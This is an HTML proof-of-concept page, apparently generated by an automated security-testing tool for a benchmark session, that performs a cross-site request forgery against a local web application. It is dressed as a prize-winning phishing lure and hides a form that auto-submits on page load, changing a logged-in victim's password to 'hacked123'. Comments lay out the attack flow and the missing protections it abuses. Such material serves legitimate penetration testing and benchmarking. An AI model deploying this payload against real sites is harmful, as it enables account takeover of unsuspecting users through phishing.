<!-- 
POC: CSRF attack POC that automatically submits a password change request to /password/test endpoint when a victim visits the page
Target: ./repo
Created: 2025-10-30T20:01:58.723Z
Session: benchmark-XBEN-001-24-mhdu3kmr

To test this POC:
1. Open this file in a web browser: file:///home/daytona/.pensar/executions/benchmark-XBEN-001-24-mhdu3kmr/pocs/poc_csrf_password_reset.html
2. Or serve it and navigate to the target application
3. Observe the vulnerability demonstration (e.g., XSS alert, CSRF execution)
-->

<!DOCTYPE html>
<html>
<head>
    <title>Innocent Looking Page</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 800px;
            margin: 50px auto;
            padding: 20px;
        }
        .content {
            background-color: #f0f0f0;
            padding: 20px;
            border-radius: 5px;
        }
        h1 {
            color: #333;
        }
        .hidden-form {
            display: none;
        }
    </style>
</head>
<body>
    <div class="content">
        <h1>ðŸŽ‰ Congratulations! You've Won a Prize!</h1>
        <p>Click the button below to claim your reward...</p>
        <p><em>(This is a CSRF attack demonstration - the form will auto-submit)</em></p>
    </div>

    <!-- Hidden malicious form that submits to password reset endpoint -->
    <form id="csrf-form" class="hidden-form" action="http://localhost:8082/password/test" method="POST">
        <input type="hidden" name="username" value="test">
        <input type="hidden" name="user_id" value="10032">
        <input type="hidden" name="password" value="hacked123">
    </form>

    <script>
        // Auto-submit the form when page loads
        window.onload = function() {
            console.log('[CSRF ATTACK] Submitting malicious form to http://localhost:8082/password/test');
            console.log('[CSRF ATTACK] Attempting to change password to: hacked123');
            document.getElementById('csrf-form').submit();
        };
    </script>

    <!-- 
    CSRF ATTACK DEMONSTRATION
    ==========================
    This page demonstrates a Cross-Site Request Forgery (CSRF) attack on the password reset form.
    
    Attack Flow:
    1. Victim is logged into http://localhost:8082 with valid session cookie
    2. Attacker tricks victim into visiting this malicious page (e.g., via phishing email)
    3. When page loads, the hidden form automatically submits to /password/test
    4. Browser includes victim's session cookie with the request
    5. Server processes the request and changes the password (if endpoint is vulnerable)
    
    Why it works:
    - No CSRF token validation on the password reset form
    - Session cookie lacks SameSite attribute (sent with cross-origin requests)
    - No Origin/Referer header validation
    
    To test:
    1. Login to http://localhost:8082 with credentials test:test
    2. Open this HTML file in the same browser (keep session active)
    3. The form will auto-submit, attempting to change password to 'hacked123'
    4. Check server response to see if password was changed
    -->
</body>
</html>